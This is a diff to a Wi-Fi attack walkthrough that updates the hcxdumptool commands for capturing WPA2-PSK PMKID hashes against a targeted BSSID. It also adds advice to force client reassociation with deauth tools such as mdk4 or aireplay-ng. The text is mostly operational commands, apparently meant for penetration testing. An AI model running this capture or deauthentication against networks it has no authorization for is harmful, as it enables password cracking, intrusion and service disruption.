@@ -1,5 +1,7 @@
 # PMKID capture — walkthrough
 
+**Verified against:** hcxdumptool 7.3 + hashcat 6.2.x as of 2026-Q3
+
 The client-free WPA2-PSK attack. One association attempt, one M1, one
 hash line. If the AP emits PMKID, you never need to see a real client.
 
@@ -17,12 +19,15 @@ airmon-ng start wlan1
 iw dev wlan1mon set channel <N>
 
 # 2. Aggressive PMKID capture — one BSSID at a time is cleanest.
-echo "AA:BB:CC:DD:EE:FF" > /root/target.bssidlist
+#    hcxdumptool 7.3 CLI; see hcx-tools/reference.md for the compat
+#    table if you're following an older tutorial.
+echo 'wlan addr3 aa:bb:cc:dd:ee:ff' > /root/target.bpf.src
+tcpdump -y IEEE802_11_RADIO -F /root/target.bpf.src -ddd \
+        > /root/target.bpf
 hcxdumptool -i wlan1mon \
-  -o /tmp/pmkid.pcapng \
-  --enable_status=1 \
-  --filterlist_ap=/root/target.bssidlist \
-  --filtermode=2
+  -w /tmp/pmkid.pcapng \
+  --enable_status=3 \
+  --bpf=/root/target.bpf
 
 # Wait for a "MP:M1M2 ROGUE" or "FOUND PMKID" line in the status.
 # Ctrl-C.
@@ -49,7 +54,10 @@ This is what makes PMKID the fast lane.
 
 Always. If PMKID lands, it lands in seconds. If it doesn't (AP
 suppresses), fall back to 4-way targeted deauth (`wpa2/walkthrough.md`
-Path B). Don't try both simultaneously — `hcxdumptool` handles both.
+Path B). `hcxdumptool` will passively grab an M2 if a natural
+reassoc happens during the same capture — but since 6.x it does
+**not** send deauth itself; force the reassoc with mdk4 /
+aireplay-ng / scapy in a second process.
 
 ## The 22000 line for a PMKID
 
